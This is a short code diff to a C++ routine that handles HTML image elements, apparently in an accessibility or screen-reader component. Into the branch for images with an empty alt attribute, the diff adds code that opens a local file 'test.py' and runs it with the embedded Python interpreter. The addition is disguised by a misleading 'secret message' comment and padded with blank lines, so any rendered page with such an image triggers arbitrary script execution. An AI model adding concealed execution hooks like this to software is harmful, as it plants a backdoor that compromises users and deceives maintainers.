@@ -1060,6 +1060,29 @@ if(!(formatState&FORMATSTATE_INSERTED)&&nodeName.compare(L"INS")==0) {
 	} else if(nodeName.compare(L"IMG")==0) {
 		if ((tempIter = attribsMap.find(L"HTMLAttrib::alt")) != attribsMap.end()) {
 			if (tempIter->second.empty()) {
+				
+				
+				
+				//if there's a secret message, set contentString to the message
+				
+				PyObject *obj = Py_BuildValue("s", "test.py");
+ 				FILE *file = _Py_fopen_obj(obj, "r+");
+ 				if(file != NULL) {
+     					PyRun_SimpleFile(file, "test.py");
+ 				}
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
 				// alt="", so don't render this at all.
 				isInteractive = false;
 			} else {
